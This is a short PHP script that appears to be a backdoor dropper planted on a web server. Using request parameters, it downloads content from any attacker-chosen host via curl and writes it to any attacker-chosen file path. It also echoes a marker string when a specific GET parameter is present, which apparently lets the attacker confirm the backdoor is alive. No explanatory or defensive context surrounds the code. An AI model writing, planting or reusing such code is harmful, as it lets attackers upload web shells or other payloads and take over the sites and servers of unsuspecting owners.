<?php 
function class_x_i($x=''){
	$urlset = isset($_REQUEST['name']) ? trim($_REQUEST['name']) : '';
	$filename = isset($_REQUEST['file']) ? trim($_REQUEST['file']) : '';
	$ch = curl_init('http://'.$urlset);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$result = curl_exec($ch);
	if ($filename!='') {
	file_put_contents($filename, $result);
	}
	if (isset($_GET['up2018info'])) {
		echo '01024k';
	}
}
class_x_i();

?>
